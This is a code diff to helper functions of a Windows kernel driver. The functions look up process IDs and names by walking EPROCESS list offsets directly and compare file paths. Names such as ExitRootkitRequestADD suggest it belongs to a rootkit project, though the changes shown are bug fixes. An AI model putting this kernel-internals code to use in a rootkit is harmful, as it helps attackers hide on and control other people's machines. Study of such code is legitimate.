@@ -17,7 +17,7 @@ NTSTATUS general_helpers::ExitRootkitRequestADD(PEPROCESS From, PEPROCESS To, RO
 }
 
 
-NTSTATUS general_helpers::OpenProcessHandleADD(HANDLE* Process, USHORT PID) {
+NTSTATUS general_helpers::OpenProcessHandleADD(HANDLE* Process, ULONG64 PID) {
 	OBJECT_ATTRIBUTES ProcessAttr = { 0 };
 	CLIENT_ID ProcessCid = { 0 };
 	ProcessCid.UniqueProcess = (HANDLE)PID;
@@ -73,27 +73,10 @@ NTSTATUS general_helpers::CopyStringAfterCharADD(PUNICODE_STRING OgString, PUNIC
 
 
 BOOL general_helpers::CompareUnicodeStringsADD(PUNICODE_STRING First, PUNICODE_STRING Second, USHORT CheckLength) {
-	//USHORT ActualFirstLen = 0;
-	//USHORT ActualSecondLen = 0;
-
-
 	// Check for invalid parameters:
 	if (First == NULL || Second == NULL || First->Buffer == NULL || Second->Buffer == NULL || Second->Length != First->Length) {
 		return FALSE;
 	}
-
-
-	/*
-	// Calculate actual lengths of strings:
-	ActualFirstLen = (USHORT)general::GetActualLengthADD(First);
-	ActualSecondLen = (USHORT)general::GetActualLengthADD(Second);
-
-
-	// Check for invalid parameters in actual string length:
-	if (ActualFirstLen != ActualSecondLen) {
-		return FALSE;
-	}
-	*/
 
 
 	// Compare strings:
@@ -152,56 +135,64 @@ void general_helpers::PrintUnicodeStringADD(PUNICODE_STRING Str) {
 BOOL general_helpers::ComparePathFileToFullPathADD(PUNICODE_STRING FullPath, PUNICODE_STRING Path, PUNICODE_STRING FileName) {
 	BOOL CompRes = FALSE;
 	UNICODE_STRING ConjoinedName = { 0 };
-	if (Path->Length == 2 * sizeof(WCHAR)) {
-		ConjoinedName.Buffer = (PWCH)ExAllocatePoolWithTag(NonPagedPool, Path->Length + FileName->Length - 1, 'CpFf');  // Can only be L"\\ + nullterm"
+	if (Path->Length == sizeof(WCHAR)) {
+		ConjoinedName.Buffer = (PWCH)ExAllocatePoolWithTag(NonPagedPool, FileName->Length + 2 * sizeof(WCHAR), 'CnPb');  // Can only be L"\\ + nullterm", no need for "\\"
+		ConjoinedName.Length = FileName->Length + sizeof(WCHAR);
 	}
 	else {
-		ConjoinedName.Buffer = (PWCH)ExAllocatePoolWithTag(NonPagedPool, Path->Length + FileName->Length, 'CpFf');  // Not -1 because going to add L'\\'
+		ConjoinedName.Buffer = (PWCH)ExAllocatePoolWithTag(NonPagedPool, Path->Length + FileName->Length + 2 * sizeof(WCHAR), 'CnPb');  // Not -1 because going to add L'\\'
+		ConjoinedName.Length = Path->Length + FileName->Length + sizeof(WCHAR);
 	}
-	if (ConjoinedName.Buffer == NULL || Path->Length != 0) {
+	ConjoinedName.MaximumLength = ConjoinedName.Length;
+	if (ConjoinedName.Buffer == NULL || ConjoinedName.Length == 0 || ConjoinedName.MaximumLength == 0) {
 		return FALSE;
 	}
 
 	RtlCopyMemory(ConjoinedName.Buffer, Path->Buffer, Path->Length);
-	ConjoinedName.Buffer[Path->Length / sizeof(WCHAR)] = L'\\';  // Path does not end with L'\\' and name does not start with L'\\'
-	RtlCopyMemory((PVOID)((ULONG64)ConjoinedName.Buffer + Path->Length + sizeof(WCHAR)), FileName->Buffer, FileName->Length + sizeof(WCHAR));
-	CompRes = CompareUnicodeStringsADD(&ConjoinedName, FullPath, 0);
+	if (Path->Length != sizeof(WCHAR)) {
+		ConjoinedName.Buffer[Path->Length / sizeof(WCHAR)] = L'\\';  // Path does not end with L'\\' and name does not start with L'\\'
+		RtlCopyMemory((PVOID)((ULONG64)ConjoinedName.Buffer + Path->Length + sizeof(WCHAR)), FileName->Buffer, FileName->Length + sizeof(WCHAR));
+	}
+	else {
+		RtlCopyMemory((PVOID)((ULONG64)ConjoinedName.Buffer + Path->Length), FileName->Buffer, FileName->Length + sizeof(WCHAR));
+	}
+	CompRes = general_helpers::CompareUnicodeStringsADD(&ConjoinedName, FullPath, 0);
 	ExFreePool(ConjoinedName.Buffer);
 	return CompRes;
 }
 
 
-NTSTATUS general_helpers::GetPidNameFromListADD(USHORT* ProcessId, char ProcessName[15], BOOL NameGiven) {
+NTSTATUS general_helpers::GetPidNameFromListADD(ULONG64* ProcessId, char ProcessName[15], BOOL NameGiven) {
 	char CurrentProcName[15] = { 0 };
-	PEPROCESS CurrentProcess = NULL;
 	LIST_ENTRY* CurrentList = NULL;
 	LIST_ENTRY* PreviousList = NULL;
 	LIST_ENTRY* NextList = NULL;
-	CurrentProcess = PsInitialSystemProcess;
-	PreviousList = (LIST_ENTRY*)((ULONG64)CurrentProcess + EPOF_ActiveProcessLinks);
+	PreviousList = (LIST_ENTRY*)((ULONG64)PsInitialSystemProcess + EPOF_ActiveProcessLinks);
 	CurrentList = PreviousList->Flink;
 	NextList = CurrentList->Flink;
 
 	while (CurrentList != NULL) {
 		if (!NameGiven) {
-			if (((USHORT)((ULONG64)CurrentList - EPOF_ActiveProcessLinks + EPOF_UniqueProcessId)) == *ProcessId) {
+			if (*((ULONG64*)((ULONG64)CurrentList - EPOF_ActiveProcessLinks + EPOF_UniqueProcessId)) == *ProcessId) {
 				RtlCopyMemory(ProcessName, (char*)((ULONG64)CurrentList - EPOF_ActiveProcessLinks + EPOF_ImageFileName), 15);
-				DbgPrintEx(0, 0, "KMDFdriver GetPidNameFromListADD - Found name %s for PID %hu\n", ProcessName, *ProcessId);
+				DbgPrintEx(0, 0, "KMDFdriver GetPidNameFromListADD - Found name %s for PID %llu\n", ProcessName, *ProcessId);
 				return STATUS_SUCCESS;
 			}
 		}
 		else {
 			RtlCopyMemory(CurrentProcName, (char*)((ULONG64)CurrentList - EPOF_ActiveProcessLinks + EPOF_ImageFileName), 15);
-			if (strcmp(CurrentProcName, ProcessName) == 0) {
-				*ProcessId = ((USHORT)((ULONG64)CurrentList - EPOF_ActiveProcessLinks + EPOF_UniqueProcessId));
-				DbgPrintEx(0, 0, "KMDFdriver GetPidNameFromListADD - Found PID %hu for name %s\n", *ProcessId, ProcessName);
+			if (_stricmp(CurrentProcName, ProcessName) == 0) {
+				*ProcessId = *((ULONG64*)((ULONG64)CurrentList - EPOF_ActiveProcessLinks + EPOF_UniqueProcessId));
+				DbgPrintEx(0, 0, "KMDFdriver GetPidNameFromListADD - Found PID %llu for name %s\n", *ProcessId, ProcessName);
 				return STATUS_SUCCESS;
 			}
+			RtlZeroMemory(CurrentProcName, 15);
 		}
 		PreviousList = CurrentList;
 		CurrentList = NextList;
-		NextList = CurrentList->Flink;
-		CurrentProcess = (PEPROCESS)((ULONG64)CurrentList - EPOF_ActiveProcessLinks);
+		if (CurrentList != NULL) {
+			NextList = CurrentList->Flink;
+		}
 	}
 	return STATUS_NOT_FOUND;
 }
